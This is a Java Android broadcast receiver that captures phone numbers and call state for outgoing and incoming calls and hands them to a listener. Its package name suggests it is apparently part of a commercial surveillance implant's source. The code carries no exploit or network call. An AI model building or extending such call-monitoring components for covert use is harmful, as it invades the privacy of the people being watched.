package com.ht.RCSAndroidGUI.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.ht.RCSAndroidGUI.Call;

public class BroadcastMonitorCall extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorCall";

	/* (non-Javadoc)
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context, android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		Call call;
	
		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
			String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
	
			// Outgoing phone call
			call = new Call(number, false, true);
		} else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_RINGING)) {
			String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

			// Phone is ringing
			call = new Call(number, true, true);
        } else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_IDLE)) {
        	// Call disconnected
        	call = new Call("", true, false);
        } else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
        	// Call answered, or issuing new outgoing call
        	call = new Call("", false, true);
        } else {
        	call = new Call("", false, false);
        }

		// Caller/Callee number, incoming?/outgoing, in progress?/disconnected
		ListenerCall.self().dispatch(call);
	}
}
